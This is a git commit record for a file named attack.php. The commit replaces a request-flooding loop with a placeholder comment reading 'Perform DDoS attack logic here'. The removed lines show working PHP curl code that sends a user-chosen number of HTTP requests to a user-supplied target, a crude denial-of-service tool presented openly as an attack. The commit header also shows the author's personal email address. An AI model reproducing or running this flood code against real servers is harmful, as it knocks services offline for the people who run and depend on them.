8fae83548b1197f2e54f52fc5f6baf50a41f84f0
unix-cmd <rktemme@gmail.com>
2025-04-10 16:48:49 +0200

    Update attack.php

--- attack.php
+++ attack.php
@@ -3,13 +3,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $target = $_POST["target"];
     $requests = $_POST["requests"];
     
-    for ($i = 0; $i < $requests; $i++) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "http://" . $target);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $output = curl_exec($ch);
-        curl_close($ch);
-        echo $output;
-    }
+    // Perform DDoS attack logic here
+    
+    // ...
 }
 ?>
